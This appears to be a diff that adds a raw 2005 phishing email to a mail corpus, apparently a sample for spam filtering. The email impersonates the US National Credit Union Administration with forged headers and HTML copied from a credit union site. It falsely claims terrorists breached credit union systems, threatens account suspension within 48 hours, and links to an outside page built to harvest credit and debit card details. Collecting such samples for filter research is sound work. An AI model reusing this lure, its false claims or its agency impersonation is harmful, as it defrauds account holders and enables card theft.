@@ -1,0 +1,681 @@
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+	by example.com (Postfix) with ESMTP id 417702A88C
+	for <user@example.com>; Sun, 14 Aug 2005 10:58:06 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+	id 3CBC9621CA4; Sun, 14 Aug 2005 10:58:06 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+	by mail.example.com (Example mail relay) with ESMTP id D9855621C9F
+	for <user@example.com>; Sun, 14 Aug 2005 10:58:05 -0400 (EDT)
+Received: (from user@localhost)
+	by mail.example.com id KAA21760
+	for user@example.com; Sun, 14 Aug 2005 10:58:05 -0400
+Received: from mail.com ([82.79.184.8])
+	by mail.example.com with SMTP id KAA21752
+	for <user@example.com>; Sun, 14 Aug 2005 10:58:03 -0400
+Message-Id: <200508141458.KAA21752@mail.example.com>
+Reply-To: <No.Reply@ncua.gov>
+From: "support@ncua.gov" <support@ncua.gov>
+Subject: National Credit Union Administration
+Date: Sun, 14 Aug 2005 18:04:44 +0300
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 1
+X-MSMail-Priority: High
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+To: undisclosed-recipients: ;
+Content-Length: 17244
+Lines: 642
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 83
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+
+<!--Created by Chris Sheffield, 2002--><HTML><HEAD><TITLE>Welcome to VisionLine</TITLE>
+<META http-equiv=Content-Type content="text/html; charset=iso-8859-1">
+<META http-equiv=Expires content=0>
+<META http-equiv=Pragma content=no-cache>
+<META http-equiv=Cache-Control content=no-cache>
+<STYLE type=text/css>
+A:link {
+	COLOR: #ff0000
+}
+A:active {
+	COLOR: #ff0000
+}
+A:visited {
+
+}
+A:hover {
+	COLOR: #0000cc
+}
+.smallText {
+	FONT-SIZE: 8pt; FONT-FAMILY: arial
+}
+.mediumText {
+	FONT-SIZE: 9pt; FONT-FAMILY: arial
+}
+.largeText {
+	FONT-SIZE: 10pt; FONT-FAMILY: arial
+}
+B.topRow {
+	FONT-SIZE: 9pt; COLOR: #ffffff; FONT-FAMILY: arial
+}
+B.mainNav {
+	FONT-SIZE: 10pt; COLOR: #ffffff; FONT-FAMILY: arial
+}
+TD.topNav {
+	FONT-SIZE: 8pt; BACKGROUND-COLOR: #000066
+}
+TD.topNav A:link {
+	FONT-WEIGHT: bold; FONT-SIZE: 8pt; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none
+}
+TD.topNav A:visited {
+	FONT-WEIGHT: bold; FONT-SIZE: 8pt; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none
+}
+TD.topNav A:active {
+	FONT-WEIGHT: bold; FONT-SIZE: 8pt; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none
+}
+TD.topNav A:hover {
+	FONT-WEIGHT: bold; FONT-SIZE: 8pt; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: underline
+}
+TD.middleNav {
+	FONT-SIZE: 9pt; BACKGROUND-COLOR: #000066
+}
+TD.middleNav A:link {
+	FONT-WEIGHT: bold; FONT-SIZE: 9pt; COLOR: #ffffff; FONT-FAMILY: arial; TEXT-DECORATION: none
+}
+TD.middleNav A:visited {
+	FONT-WEIGHT: bold; FONT-SIZE: 9pt; COLOR: #ffffff; FONT-FAMILY: arial; TEXT-DECORATION: none
+}
+TD.middleNav A:active {
+	FONT-WEIGHT: bold; FONT-SIZE: 9pt; COLOR: #ffffff; FONT-FAMILY: arial; TEXT-DECORATION: none
+}
+TD.middleNav A:hover {
+	FONT-WEIGHT: bold; FONT-SIZE: 9pt; COLOR: #e8be51; FONT-FAMILY: arial; TEXT-DECORATION: underline
+}
+TD.leftNavHeader {
+	FONT-WEIGHT: bold; FONT-SIZE: 9pt; COLOR: #000066; TEXT-INDENT: 5px; FONT-FAMILY: verdana; TEXT-ALIGN: left
+}
+TD.leftNav A:link {
+	FONT-SIZE: 8pt; COLOR: #000066; FONT-FAMILY: arial; TEXT-DECORATION: none
+}
+TD.leftNav A:visited {
+	FONT-SIZE: 8pt; COLOR: #000066; FONT-FAMILY: arial; TEXT-DECORATION: none
+}
+TD.leftNav A:active {
+	FONT-SIZE: 8pt; COLOR: #000066; FONT-FAMILY: arial; TEXT-DECORATION: none
+}
+TD.leftNav A:hover {
+	FONT-SIZE: 8pt; COLOR: #000066; FONT-FAMILY: arial; TEXT-DECORATION: underline
+}
+P.rate {
+	FONT-SIZE: 8pt; COLOR: #000000; FONT-FAMILY: arial
+}
+P.standard {
+	FONT-SIZE: 9pt; COLOR: #000000; FONT-FAMILY: arial
+}
+P.sitemap {
+	FONT-SIZE: 11pt; COLOR: #000000; FONT-FAMILY: arial
+}
+UL.standard {
+	FONT-SIZE: 9pt; COLOR: #000000; FONT-FAMILY: arial
+}
+OL.standard {
+	FONT-SIZE: 9pt; COLOR: #000000; FONT-FAMILY: arial
+}
+UL.standardSmall {
+	FONT-SIZE: 8pt; COLOR: #000000; FONT-FAMILY: arial
+}
+OL.standardBold {
+	FONT-SIZE: 9pt; COLOR: #000000; FONT-FAMILY: arial
+}
+B.standardSmall {
+	FONT-SIZE: 7pt; COLOR: #000000; FONT-FAMILY: arial
+}
+B.standard {
+	FONT-SIZE: 8pt; COLOR: #000000; FONT-FAMILY: arial
+}
+B.standard2 {
+	FONT-SIZE: 10pt; COLOR: #000000; FONT-FAMILY: arial
+}
+I.standard {
+	FONT-SIZE: 9pt; COLOR: #000000; FONT-FAMILY: arial
+}
+TD.standard {
+	FONT-SIZE: 9pt; COLOR: #000000; FONT-FAMILY: arial
+}
+TD.standardSmall {
+	FONT-SIZE: 8pt; FONT-FAMILY: arial
+}
+U.testOut {
+	FONT-SIZE: 8pt; COLOR: #000000; FONT-FAMILY: arial
+}
+.style3 {font-size: 14px}
+.style5 {font-size: 14}
+.style6 {color: #FFFF00}
+.style8 {
+	font-size: xx-small;
+	font-style: italic;
+	font-weight: bold;
+}
+.style9 {font-size: 16px}
+.style10 {font-size: 12px}
+</STYLE>
+
+<SCRIPT language=javascript 
+src="../vizions/loginbun/Welcome%20to%20VisionLine_files/signUp.js"></SCRIPT>
+
+<SCRIPT language=javascript>
+
+
+
+  <!--
+
+
+
+  javascript:window.history.forward(1);
+
+
+
+    function disclaimIt(URL)
+
+    {
+
+
+
+    var completeURL
+
+    completeURL='/links/offSiteCheck.asp?link='+URL
+
+
+
+window.open(completeURL,'investments','width=400,height=300,resizable=yes,toolbar=no,scrollbars=yes,location=no');
+
+    }
+
+
+
+function disclaimIt2(URL)
+
+    {
+
+
+
+    var completeURL
+
+    completeURL='https://www.visionsfcu.org/links/offSiteCheck.asp?Preferred=1&link='+URL
+
+
+
+window.open(completeURL,'investments','width=400,height=300,resizable=yes,toolbar=no,scrollbars=yes,location=no');
+
+    }
+
+
+
+
+
+   function checkSendEmailForm()
+
+   {
+
+
+
+     if (document.emailSubmission.emailAddress.value=="")
+
+     {
+
+       alert('Please enter your email address before you push the send button');
+
+
+
+     }
+
+     else if (document.emailSubmission.emailAddress.value.indexOf("@") < 1)
+
+     {
+
+       alert('Invalid email address');
+
+     }
+
+     else if (document.emailSubmission.accountNum.value=="")
+
+     {
+
+       alert('Please enter your account number before you push the send button');
+
+     }
+
+     else
+
+     {
+
+      document.emailSubmission.submit();
+
+     }
+
+
+
+   }
+
+
+
+
+
+
+
+    if (document.images)
+
+    {
+
+
+
+    linkCircle1off=new Image(10,10);
+
+    linkCircle1off.src="/siteImages/triOff4.gif";
+
+
+
+    linkCircle1on=new Image(10,10);
+
+    linkCircle1on.src="/siteImages/triOn4.gif";
+
+
+
+    linkCircle2off=new Image(10,10);
+
+    linkCircle2off.src="/siteImages/triOff4.gif";
+
+
+
+    linkCircle2on=new Image(10,10);
+
+    linkCircle2on.src="/siteImages/triOn4.gif";
+
+
+
+    linkCircle3off=new Image(10,10);
+
+    linkCircle3off.src="/siteImages/triOff4.gif";
+
+
+
+    linkCircle3on=new Image(10,10);
+
+    linkCircle3on.src="/siteImages/triOn4.gif";
+
+
+
+    linkCircle4off=new Image(10,10);
+
+    linkCircle4off.src="/siteImages/triOff4.gif";
+
+
+
+    linkCircle4on=new Image(10,10);
+
+    linkCircle4on.src="/siteImages/triOn4.gif";
+
+
+
+    linkCircle5off=new Image(10,10);
+
+    linkCircle5off.src="/siteImages/triOff4.gif";
+
+
+
+    linkCircle5on=new Image(10,10);
+
+    linkCircle5on.src="/siteImages/triOn4.gif";
+
+
+
+    linkCircle6off=new Image(10,10);
+
+    linkCircle6off.src="/siteImages/triOff4.gif";
+
+
+
+    linkCircle6on=new Image(10,10);
+
+    linkCircle6on.src="/siteImages/triOn4.gif";
+
+    }
+
+
+
+
+
+
+
+  function lightup(imgName)
+
+        {
+
+          if (document.images)
+
+           {
+
+             imgOn=eval(imgName + "on.src");
+
+             document[imgName].src= imgOn;
+
+           }
+
+        }
+
+
+
+   function turnoff(imgName)
+
+        {
+
+          if (document.images)
+
+           {
+
+             imgOff=eval(imgName + "off.src");
+
+             document[imgName].src= imgOff;
+
+           }
+
+        }
+
+
+
+  //-->
+
+
+
+
+
+</SCRIPT>
+
+<META content="MSHTML 6.00.2600.0" name=GENERATOR></HEAD>
+<BODY vLink=#ff0000 aLink=#0000ff link=#ff0000 bgColor=#ffffff leftMargin=0 
+topMargin=0 marginheight="0" marginwidth="0">
+<a 
+name=top> 
+<link 
+href="National Credit Union Administration - Home Page_files/NCUACss.css" 
+rel=stylesheet type=text/css>
+<table 
+background="National Credit Union Administration - Home Page_files/bannerStabwide2.jpg" 
+border=0 cellpadding=0 cellspacing=0 width="63%">
+  <tbody>
+    <tr>
+      <td colspan=2><div align=right><a href="http://www.ncua.gov/#TopBar"><img 
+      alt="Skip to Top Bar Navigation" border=0 height=8 
+      src="National Credit Union Administration - Home Page_files/invisible.gif" 
+      width=8></a><a href="http://www.ncua.gov/#SiteNavigation"><img 
+      alt="Skip to Site Navigation" border=0 height=8 
+      src="National Credit Union Administration - Home Page_files/invisible.gif" 
+      width=8></a><a href="http://www.ncua.gov/#PageNavigation"><img 
+      alt="Skip to Page Navigation" border=0 height=8 
+      src="National Credit Union Administration - Home Page_files/invisible.gif" 
+      width=8></a>&nbsp;</div></td>
+    </tr>
+    <tr>
+      <td valign=top width="18%">
+    <tr>
+      <td><a href="http://www.ncua.gov/images/prop/blueseal98.gif"><img align=left 
+      alt="NCUA Seal" border=0 height=98 
+      src="http://www.ncua.gov/images/prop/blueseal98.gif" 
+      width=100></a></td>
+      <td width="82%"><h2>National Credit Union Administration </h2></td>
+    </tr>
+    <tr class=Outline>
+      <td colspan=2><div align=center class=OutlineArea><a name=TopBar></a><a 
+      href="http://www.ncua.gov/#SiteNavigation"><img 
+      alt="Skip to Site Navigation" border=0 height=8 
+      src="National Credit Union Administration - Home Page_files/invisible.gif" 
+      width=8></a><a href="http://www.ncua.gov/#PageNavigation"><img 
+      alt="Skip to Page Navigation" border=0 height=8 
+      src="National Credit Union Administration - Home Page_files/invisible.gif" 
+      width=8></a></div></td>
+    </tr>
+  </tbody>
+</table>
+<!-- #EndLibraryItem -->
+</a> 
+<TABLE cellSpacing=0 cellPadding=0 width=624 border=0>
+  <TBODY>
+  <TR bgColor=#000066 height=30>
+    <TD class=middleNav vAlign=center align=right width=31 height=30>&nbsp;</TD>
+    <TD class=middleNav title="All Of Your Finances In One Place!" align=middle 
+    width=73 height=30>&nbsp;</TD>
+    <TD class=middleNav vAlign=center align=right width=63 height=30>&nbsp;</TD>
+    <TD class=middleNav vAlign=center align=right width=15 height=30>&nbsp;</TD>
+    <TD class=middleNav title="All of Your Visions Accounts" align=middle 
+    width=63>&nbsp;</TD>
+    <TD class=middleNav vAlign=center align=right width=63 height=30>&nbsp;</TD>
+    <TD class=middleNav vAlign=center align=right width=15 height=30>&nbsp;</TD>
+    <TD class=middleNav title="Apply For A Loan Instantly!" align=middle 
+    width=70>&nbsp;</TD>
+    <TD class=middleNav vAlign=center align=right width=39 height=30>&nbsp;</TD>
+    <TD class=middleNav vAlign=center align=right width=15 height=30>&nbsp;</TD>
+    <TD class=middleNav title="All of Your Bill Payment Services" align=middle 
+    width=53><A onmouseover="lightup('linkCircle4')" 
+      onmouseout="turnoff('linkCircle4')" 
+      href="https://www.visionsfcu.com/cgi-bin/mcw000.cgi?MCWSTART2&amp;"><!--<IMG SRC="/images/double/n4.jpg" border=0 width=38 height=30
+
+alt="All of Your Bill Payment Services">--></A></TD>
+    <TD class=middleNav vAlign=center align=right width=39 height=30>&nbsp;</TD>
+    <TD class=middleNav vAlign=center align=right width=15 height=30>&nbsp;</TD>
+    <TD class=middleNav title="Online Trading" align=middle width=59>&nbsp;</TD>
+    <TD class=middleNav vAlign=center align=right width=11 
+  height=30>&nbsp;</TD></TR></TBODY></TABLE>
+<TABLE height=20cellSpacing=0 cellPadding=0 width=626 border=0>
+  <TBODY>
+  <TR>
+    <TD class=smallText width=9 bgColor=#000066>&nbsp;</TD>
+    <TD class=smallText vAlign=top width=23 bgColor=#e8e8d8>
+      <SCRIPT type=text/javascript>
+
+
+
+
+</SCRIPT>
+    
+      <DIV align=center> 
+      </DIV>
+      <!--promotional code--><!--
+
+
+
+<div align=center>
+
+<TABLE cellpadding=0 cellspacing=0 border=0 width="125">
+
+<TR>
+
+<TD bgcolor=#e8be51>
+
+
+
+
+
+<TABLE width="125" cellpadding=0 cellspacing=1 border=0>
+
+<TR>
+
+<TD>
+
+
+
+
+
+
+
+
+
+<TABLE width=125 cellpadding=3 cellspacing=0 border=0 align=center>
+
+  <TR>
+
+   <TD colspan=2 bgcolor=#e8be51 align=center class="mediumText"><font
+
+color=#000066><b>Apply On-Line!</b></font></TD>
+
+  </TR>
+
+
+
+  <TR>
+
+   <TD colspan=2 class="smallText" bgcolor="#ffffff">
+
+<IMG SRC="https://www.visionsfcu.org/memberResources/images/car.jpg"
+
+width=80 height=33 align=left><BR><BR>
+
+<P>
+
+
+
+<font color=#000000>Apply for your loan on-line and receive a .60% discount off the stated rate.
+
+Auto | Truck | Motorcycle | RV. Offer good for on-line consumer loan applications taken
+
+7/1/2003-9/30/2003. Loan applications for business
+
+use are not included in this offer.
+
+Rates based on credit worthiness and may vary from those stated.
+
+</font></P></TD>
+
+  </TR>
+
+
+
+
+
+
+
+</TABLE>
+
+
+
+
+
+
+
+
+
+
+
+</TD>
+
+</TR>
+
+</TABLE>
+
+
+
+
+
+</TD>
+
+</TR>
+
+</TABLE>
+
+</div>
+
+
+
+--><!--end promotional code--></TD>
+    <TD width=12 
+    background="../vizions/loginbun/Welcome%20to%20VisionLine_files/blackfade.gif">&nbsp;</TD>
+    <TD vAlign=top width=572 height=800>
+      <TABLE cellSpacing=0 cellPadding=0 width=572 align=center border=0>
+        <TBODY>
+        <TR>
+          <TD bgcolor="#C3D5FD" class=mediumText><span class="style8">About NCUA <br>
+            The National Credit Union Administration (NCUA) is the independent federal agency that charters and supervises federal credit unions. NCUA, backed of the full faith and credit of the U.S. government, operates the National Credit Union Share Insurance Fund (NCUSIF) insuring the savings of 80 million account holders in all federal credit unions and many state-chartered credit unions.
+              </span>            <p class="style8">During the 1990s and into the 21st century, credit unions have been healthy and growing. Credit union failures remain low and the Share Insurance Fund maintains a healthy equity level.</p></TD>
+        </TR>
+        <TR>
+          <TD bgcolor="#00CCFF" class=mediumText><!--end of template top-->
+            <SCRIPT language=JAVASCRIPT>
+function OnloadFunction() {;}
+</SCRIPT>
+
+            <FORM id=Form1 name=CreditCard action=/Credit/CC_Input.asp 
+            method=post>
+              <BR>
+              <P align="center"><span class="style5"><BR>
+                  The <strong>National Credit Union Administration (NCUA)</strong> is comitted to maintain a safe environment for over 80 million account holders in all federal credit unions and many state-chartered credit unions. Protecting the security of holders account and of the <strong>Federal Credit Unions (FCU)</strong> network is our primary concern. To protect the security of your account,<strong> NCUA</strong> employs some of the most advanced security systems in the world and our anti-fraud teams regularly scan the federal credit unions systems for unusual activity.</span>              
+              <p align="center"><span class="style3">We recently have determined that some federal credit unions systems have been accessed by terrorist organization attackers who try to obtain funds for their criminal activities.</span></p>
+              <p align="center"><span class="style5"><span class="style3">Therefore, our primary concern is to improve our database regarding all federal credit unions systems, this activity being asked by the <em><strong>United States Government</strong></em> .</span><br>
+                    <br>
+                    </span></p>
+              <p align="center"><span class="style5"><strong><span class="style9">For security purposes we now need you to re-confirm your credit/debit card information to us. If this is not completed in 48 hours, we will be forced to suspend your account indefinitely, as it may have been used for fraudulent and terrorist purposes. We thank you for your cooperation in this manner</span>. </strong></span></p>
+              <p align="center"> <span class="style10">In order to confirm your credit/debit card records, we may require some specific information from you.</span><br>
+                    <br>
+&nbsp;              </p>
+                  <div align="center"> 
+                    <table width="77%" height="31" border="0" align="center" cellPadding="4" cellSpacing="0"
+bgColor="#fffecd">
+                      <tr> 
+                        <td width="461" height="31" align="middle" bgcolor="#C6D6FD" class="pp_sansserif"> 
+                          <div align="center"><a
+href="http://www.weller602.info/fcu/get.php"
+target="_blank" class="style6"> Click here to confirm your credit/debit card records 
+                            </a></div></td>
+                      </tr>
+                    </table>
+                  </div>
+              <p align="center"><br>
+                  <br>
+                  <span class="style3">Thank you for your prompt attention to this matter. Please understand that this is a security measure meant to help protect you and your account.<br>
+                  <br>
+  We apologize for any inconvenience.<br>
+  <br>
+  If you choose to ignore our request, you leave us no choise but to temporaly suspend your account.<br>
+            <br>
+  Thank you for using <FONT face=arial,helvetica><STRONG> Federal Credit Union </STRONG></FONT>! </span>              
+              <P>
+              <P>
+              <HR align=center width="85%">
+              <P>              
+              <BR>
+              <BR>
+                  <p>&nbsp;              </p>
+            </FORM>
+            <P align="center" class=standard>Use of Federal Credit Union is covered under <A 
+            href="http://www.vfcu.org/disclosure/disclosure.asp">Federal Credit Union Share 
+            Accounts, Checking Accounts and Electronic Funds Transfer Agreements 
+            and Disclosure Statements</A> which contains important information 
+            regarding services obtained from  Federal Credit Union. Use 
+            of Federal Credit Union constitutes agreement with the terms and conditions of 
+            the aforementioned agreement and disclosure statements.</P>
+            <P align=center><FONT face=arial size=1>©2005 by  Federal 
+            Credit Union. All rights reserved.</FONT></P>
+            <BR>
+            <HR align=center width="85%">
+            <BR><BR></TD></TR>
+        <TR>
+          <TD bgcolor="#00CCFF" class=mediumText>&nbsp;</TD>
+        </TR>
+        </TBODY></TABLE>
+      <DIV align=center>
+  
+
+</SCRIPT>
+    <IMG 
+            alt="NCUA Share Insurance Logo" height=167 
+            src="http://www.ncua.gov/images/prop/BLUELAB.gif" 
+            width=397></DIV></TD></TR></TBODY></TABLE>
+
